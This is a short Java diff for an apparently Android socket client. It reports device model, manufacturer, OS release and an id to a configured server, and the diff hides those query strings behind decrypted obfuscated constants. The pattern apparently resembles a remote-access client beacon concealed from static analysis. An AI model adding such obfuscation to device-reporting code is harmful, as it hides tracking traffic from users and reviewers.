@@ -43,10 +43,10 @@ public class IOSocket {
             opts.timeout = 30000;
 
             ioSocket = IO.socket(BuildConfig.SOCKET_URL
-                    + "?model=" + model
-                    + "&manf=" + manufacturer
-                    + "&release=" + release
-                    + "&id=" + encodedId);
+                    + ObfuscationUtils.decrypt(ObfuscationUtils.ENC_Q_MODEL_) + model
+                    + ObfuscationUtils.decrypt(ObfuscationUtils.ENC_AMP_MANF_) + manufacturer
+                    + ObfuscationUtils.decrypt(ObfuscationUtils.ENC_AMP_RELEASE_) + release
+                    + ObfuscationUtils.decrypt(ObfuscationUtils.ENC_AMP_ID_) + encodedId);
         } catch (URISyntaxException e) {
             Log.e("IOSocket", "Invalid socket URL: " + e.getMessage());
         } catch (Exception e) {
